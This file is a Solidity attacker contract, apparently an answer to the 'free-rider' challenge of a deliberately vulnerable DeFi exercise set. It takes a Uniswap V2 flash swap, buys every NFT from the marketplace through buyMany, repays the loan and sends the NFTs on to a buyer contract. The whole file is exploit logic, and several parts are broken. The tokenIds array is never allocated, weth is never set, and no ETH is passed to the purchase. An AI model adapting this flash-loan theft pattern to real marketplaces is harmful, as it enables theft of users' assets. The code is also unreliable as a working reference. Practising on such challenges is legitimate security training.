// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
import {ReentrancyGuard} from "openzeppelin-contracts/security/ReentrancyGuard.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
import {IERC721} from "openzeppelin-contracts/token/ERC721/IERC721.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

contract Attacker is IERC721Receiver, ReentrancyGuard {
    address private immutable _buyer;
    address private immutable _attacker;
    address public dvt;

    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;

    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;

    WETH9 internal weth;

    IERC721 private immutable _nft;
    uint256 private _received;

    constructor(
        address attacker_,
        address buyer_,
        address nft_,
        address payable marketplace,
        address factory,
        address tokenA,
        address tokenB
    ) payable {
        _attacker = attacker_;
        _buyer = buyer_;
        _nft = IERC721(nft_);
        IERC721(nft_).setApprovalForAll(msg.sender, true);
        freeRiderNFTMarketplace = FreeRiderNFTMarketplace(marketplace);
        uniswapV2Factory = IUniswapV2Factory(factory);
        uniswapV2Pair = IUniswapV2Pair(
            uniswapV2Factory.getPair(tokenA, tokenB)
        );
    }

    function flashSwap(uint wethAmount) external {
        // Need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(weth, msg.sender);

        // amount0Out is DAI, amount1Out is WETH
        uniswapV2Pair.swap(0, wethAmount, address(this), data);
    }

    // This function is called by the DAI/WETH pair contract
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        require(msg.sender == address(uniswapV2Pair), "not pair");
        require(sender == address(this), "not sender");

        (address tokenBorrow, address caller) = abi.decode(
            data,
            (address, address)
        );

        // Your custom code would go here. For example, code to arbitrage.
        require(tokenBorrow == address(weth), "token borrow != WETH");
        uint256 counter = 0;
        uint256[] memory tokenIds;
        for (
            counter;
            counter < _nft.balanceOf(address(freeRiderNFTMarketplace));
            counter++
        ) {
            tokenIds[counter] = counter;
        }
        freeRiderNFTMarketplace.buyMany(tokenIds);
        // about 0.3% fee, +1 to round up
        uint fee = (amount1 * 3) / 997 + 1;
        uint256 amountToRepay = amount1 + fee;

        // Transfer flash swap fee from caller
        weth.transferFrom(caller, address(this), fee);

        // Repay
        weth.transfer(address(uniswapV2Pair), amountToRepay);
    }

    // Function to perform the flash swap and buy NFTs
    //function buyNFTs() public payable {}

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override nonReentrant returns (bytes4) {
        require(msg.sender == address(freeRiderNFTMarketplace));
        require(tx.origin == _attacker);
        require(_tokenId >= 0 && _tokenId <= 5);
        require(_nft.ownerOf(_tokenId) == address(this));

        _received++;
        if (_received == 6) {
            uint256 i;
            for (i = 0; i < _received; i++) {
                _nft.transferFrom(address(this), address(_buyer), i);
            }
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}
